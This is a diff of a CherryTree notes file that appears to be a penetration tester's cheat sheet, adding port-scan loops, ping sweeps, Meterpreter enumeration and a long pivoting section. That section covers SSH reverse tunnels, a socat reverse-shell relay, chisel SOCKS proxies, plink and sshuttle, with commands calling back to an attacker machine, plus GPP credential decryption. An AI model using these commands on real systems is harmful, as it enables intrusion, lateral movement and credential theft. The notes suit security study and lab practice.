@@ -4,7 +4,16 @@
   <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1639344443">
     <rich_text>Close port
 sudo kill $(sudo lsof -t -i:445)</rich_text>
-    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1642264676">
+    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1642417039">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Port Scanning</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Linux bash loop</rich_text>
+      <rich_text>
+• for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done
+
+</rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Nmap</rich_text>
       <rich_text>
 
@@ -49,33 +58,39 @@ ls /usr/share/nmap/scripts/ | grep ‘&lt;desired_script/service&gt;’
 </rich_text>
       <rich_text weight="heavy">ICMP Echo
 </rich_text>
-      <rich_text>nmap -sP &lt;subnet&gt;
+      <rich_text>• nmap -sP &lt;subnet&gt;
 
 </rich_text>
       <rich_text weight="heavy">ARP</rich_text>
       <rich_text>
-arp-scan -I &lt;network_interface&gt; -localnet
-netdiscover -i &lt;network_interface&gt; -r &lt;ip_range&gt;
+• arp-scan -I &lt;network_interface&gt; -localnet
+• netdiscover -i &lt;network_interface&gt; -r &lt;ip_range&gt;
 
 </rich_text>
       <rich_text weight="heavy">Ping Sweep</rich_text>
       <rich_text>
-fping -g -r 1 172.16.37.0/24
+• fping -g -r 1 172.16.37.0/24
 
 </rich_text>
       <rich_text weight="heavy">DNS Cache</rich_text>
       <rich_text>
-ipconfig /displaydns
+• ipconfig /displaydns
 
 </rich_text>
       <rich_text weight="heavy">Meterpreter</rich_text>
       <rich_text>
-run arp_scanner -r &lt;ip/range&gt;
+• run arp_scanner -r &lt;ip/range&gt;
+• run post/windows/gather/enum_computers
 
 </rich_text>
       <rich_text weight="heavy">Windows batch loop</rich_text>
       <rich_text>
 • FOR /L %X IN (1,1,254) do @PING -i 3 -w 1 -n 1 192.168.%x.1 | FIND "bytes="
+
+</rich_text>
+      <rich_text weight="heavy">Linux bash loop</rich_text>
+      <rich_text>
+• for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &amp;); done
 
 
 </rich_text>
@@ -513,7 +528,7 @@ Executing shell commands
 • SELECT sys_exec('&lt;command&gt;');
 • sqlmap --os-cmd --os-shell</rich_text>
     </node>
-    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1642263785">
+    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1642503207">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SQL Related</rich_text>
       <rich_text>
 
@@ -525,24 +540,93 @@ set &lt;item&gt;='new_content' where &lt;item&gt;='item';
 set pwd='admin' where login='admin';
 
 
+
 </rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Proxying, Tunneling, Pivoting &amp; Port Forwarding</rich_text>
       <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Proxychains</rich_text>
+      <rich_text>
+
+• Copy the /etc/proxychains.conf file to the current directory to preserve the original file
+• Comment the </rich_text>
+      <rich_text style="italic">proxy_dns</rich_text>
+      <rich_text> string when running Nmap scans
+   ◇ Always run TCP scans with -Pn while scanning through the proxy, UDP will also not work
+
+</rich_text>
+      <rich_text weight="heavy">SSH</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text underline="single">Forward Connections (Bind)</rich_text>
+      <rich_text>
+
+Tunneling
+• ssh -D &lt;port&gt; user@ssh_server -fN
+
+Port Forwarding
+• ssh -L &lt;lport&gt;:&lt;rhost&gt;:&lt;rport&gt; user@ssh_server
+
+</rich_text>
+      <rich_text underline="single">Reverse Connections</rich_text>
+      <rich_text>
+
+1. Generate a set of keys
+   ◇ ssh-keygen
+2. Place the public key on the authorized_keys file
+3. Configure the access to port forward only. Paste the following command in the public key;
+   ◇ command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+4. Check if the SSH server is running on the attacker machine
+• sudo service ssh status
+• sudo systemctl status ssh
+5. Start the service if necessary
+• sudo service ssh start
+• sudo systemctl start ssh
+6. Transfer the private key to the target machine
+
+</rich_text>
+      <rich_text underline="single">Port Forward</rich_text>
+      <rich_text>
+• ssh -R &lt;lport&gt;:&lt;target_ip&gt;:&lt;target_port&gt; user@attacker_ssh -i &lt;key&gt; -fN
+• ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i key -fN
+   ◇ Running this on .16.0.5 will give the attacker (kali) access to the webserver on 16.0.10
+
+</rich_text>
+      <rich_text underline="single">Reverse Proxy</rich_text>
+      <rich_text>
+• ssh -R &lt;port&gt; user@attacker_ip -i key -fN
+
+</rich_text>
+      <rich_text underline="single">SSH (22) through Squid Proxy (3128)</rich_text>
+      <rich_text>
+• proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
+(there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost)
+
+then ssh user@127.0.0.1 -p 1234
+
+</rich_text>
+      <rich_text weight="heavy">Metasploit &amp; Meterpreter</rich_text>
+      <rich_text>
+• route add &lt;ip&gt; &lt;mask&gt; 1
+   ◇ route add 192.168.200.0 255.255.255.0 1
 
 </rich_text>
       <rich_text weight="heavy">Socat</rich_text>
       <rich_text>
-• socat TCP-LISTEN:&lt;local_port&gt;,fork,reuseaddr TCP:&lt;remote_ip&gt;:&lt;remote_port&gt; &amp;
+
+Reverse shell relay
+• socat tcp-l:8000 tcp:&lt;attacker_ip&gt;:&lt;port&gt; &amp;
+
+Port forward
+• socat tcp-l:&lt;local_port&gt;,fork,reuseaddr TCP:&lt;remote_ip&gt;:&lt;remote_port&gt; &amp;
+
 
 </rich_text>
       <rich_text weight="heavy">cURL</rich_text>
       <rich_text>
 • curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
-
-</rich_text>
-      <rich_text weight="heavy">SSH</rich_text>
-      <rich_text>
-• ssh -L &lt;lport&gt;:&lt;rhost&gt;:&lt;rport&gt; user@ssh_server_ip
 
 </rich_text>
       <rich_text weight="heavy">Ncat</rich_text>
@@ -552,36 +636,75 @@ set pwd='admin' where login='admin';
       <rich_text>
 
 </rich_text>
-      <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
-      <rich_text>
-• proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
-(there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost)
-
-then ssh user@127.0.0.1 -p 1234
-
-</rich_text>
       <rich_text weight="heavy">Chisel</rich_text>
       <rich_text>
-On local machine
-• chisel server -p 8001 --reverse
 
-On foothold attacked machine;
-• ./chisel client &lt;attacker_ip&gt;:8001 R:8000:127.0.0.1:8000
+</rich_text>
+      <rich_text underline="single">Reverse SOCKS proxy</rich_text>
+      <rich_text>
+
+On the attack machine
+• chisel server -p &lt;listen_port&gt; --reverse
+
+On the compromised machine
+• chisel client &lt;attacker_ip&gt;:&lt;listen_port&gt; R: socks
+
+</rich_text>
+      <rich_text underline="single">Forward SOCKS proxy</rich_text>
+      <rich_text>
+
+On the compromised machine
+• chisel server -p &lt;listen_port&gt; --socks5
+
+On the attack machine
+• chisel client &lt;target_ip&gt;:&lt;listen_port&gt; &lt;port_to_open&gt;:socks
+
+</rich_text>
+      <rich_text underline="single">Remote port forward</rich_text>
+      <rich_text>
+
+On the attack machine
+• chisel server -p &lt;listen_port&gt; --reverse
+
+On the compromised machine
+• chisel client &lt;attacker_ip&gt;:&lt;listen_port&gt; R:&lt;lport&gt;:&lt;target_ip&gt;:&lt;target_port&gt; &amp;
+• chisel client &lt;attacker_ip&gt;:&lt;listen_port&gt; R:8000:127.0.0.1:8000
 (8000 is the port open just for localhost, 8001 is the local port listener)
 remote:8000 -&gt; local:8001 -&gt; local:8000
 
-• chisel client &lt;attacker_ip&gt;:8080 R: socks
-
 </rich_text>
-      <rich_text weight="heavy">VPNPivot</rich_text>
-      <rich_text>
-</rich_text>
-      <rich_text style="italic">creates a VPN tunnel between the attacker and compromised Linux host</rich_text>
+      <rich_text underline="single">Local port forward</rich_text>
       <rich_text>
 
-• </rich_text>
-      <rich_text link="webs https://github.com/0x36/VPNPivot">https://github.com/0x36/VPNPivot</rich_text>
+On the compromised machine
+• chisel server -p &lt;listen_port&gt;
+
+On the attacker machine
+• chisel client &lt;listen_ip&gt;:&lt;listen_port&gt; &lt;lport&gt;:&lt;target_ip&gt;:&lt;target_port&gt;
+• chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+   ◇ This will connect to .16.0.5:8000 and forward the connection from lport 2222 to .16.0.10:22
+
+</rich_text>
+      <rich_text weight="heavy">Plink</rich_text>
       <rich_text>
+
+Convert SSH keys
+• apt install putty-tools
+• putygen &lt;key&gt; -o &lt;output&gt;.ppk
+
+• cmd .exe /c echo y | .\plink.exe -R &lt;lport&gt;:&lt;target-ip&gt;:&lt;target_port&gt; user@attacker_ip -i &lt;key&gt; -N
+• cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i key -N
+   ◇ Running this on 16.0.5, forwarding the connection from, 16.0.10:80 to 8000 on the attacker machine
+
+</rich_text>
+      <rich_text weight="heavy">SSHuttle</rich_text>
+      <rich_text>
+
+Connect to a server
+• sshuttle -r user@ssh_server &lt;subnet&gt;
+
+Connect to a key-based server
+• sshuttle -r user@ssh_server --ssh-cmd "ssh -i &lt;key&gt;" &lt;subnet&gt;
 
 
 </rich_text>
@@ -657,22 +780,22 @@ Decode &amp; Extract
 • </rich_text>
       <rich_text foreground="#e8e6e3">fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt </rich_text>
       <rich_text>file.zip</rich_text>
-      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1642352937">
+      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1642416620">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Useful Stuff</rich_text>
         <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">CMD Commands</rich_text>
+        <rich_text>
+• set
+• arp -a
+• ipconfig /all
 
 </rich_text>
         <rich_text weight="heavy">Meterpreter</rich_text>
         <rich_text>
 • run post/windows/gather/enum_applications
 • run winenum
-
-
-</rich_text>
-        <rich_text weight="heavy">CMD Commands</rich_text>
-        <rich_text>
-• set
-
 
 By default, Win7 machines inside a domain does not accept psexec commands from non-domain administrators, has UAC enabled and prevents a local admin from accessing a user's profile without an UAC prompt
 
@@ -1640,7 +1763,7 @@ set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
       <rich_text weight="heavy">Meterpreter</rich_text>
       <rich_text>
 • load extapi</rich_text>
-      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1640813035">
+      <node name="Enumeration" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640812758" ts_lastsave="1642363201">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Credential Harvesting</rich_text>
         <rich_text>
 
@@ -1656,7 +1779,12 @@ Active Directory policies are stored in the UNC path %USERDNSDOMAIN%\Policies, h
 </rich_text>
         <rich_text weight="heavy">Find Policies</rich_text>
         <rich_text>
-• dir /s *.xml</rich_text>
+• dir /s *.xml
+
+</rich_text>
+        <rich_text weight="heavy">Decrypt credentials</rich_text>
+        <rich_text>
+• gpp &lt;hash&gt;</rich_text>
       </node>
     </node>
   </node>
